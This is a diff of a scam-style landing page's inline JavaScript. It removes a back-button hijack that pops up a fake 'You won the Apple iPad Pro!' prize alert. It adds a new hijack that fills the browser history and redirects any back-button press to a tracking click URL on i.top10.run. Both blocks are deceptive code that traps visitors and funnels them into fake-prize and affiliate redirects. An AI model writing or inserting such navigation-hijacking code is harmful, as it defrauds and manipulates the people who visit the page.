@@ -358,25 +358,6 @@ var modalOptions = {
 </div>
 
 <script type="text/javascript">
-    !function () {
-        var count = 1;
-        var t;
-        try {
-            for (t = 0; 10 > t; ++t) history.pushState({}, "", "#");
-            onpopstate = function (t) {
-                if(count%2 == 1) {
-                    alert('Congratulations!You won the Apple iPad Pro!')
-
-                }
-                count++;
-                t.state && location.replace("#")
-            }
-        } catch (o) {
-        }
-    }();
-</script>
-
-<script type="text/javascript">
 
 	var nc = 'https://i.top10.run/click.php?key=wnha1n969lvkjdd0lnr3'+window.location.href.split("split=true",2)[1];
 	
@@ -415,6 +396,17 @@ var modalOptions = {
             d.addEventListener('DOMContentLoaded', epp);
         }
     })(window, document);
+
+	! function() {
+        var t;
+        try {
+            for(t = 0; 10 > t; ++t) history.pushState({}, "", "");
+                onpopstate = function(t) {
+                PreventExitPop = false
+                t.state && location.replace(nc)
+                }
+        } catch(o) {}
+    }(); 
 </script>
 <style>
 #footer a{
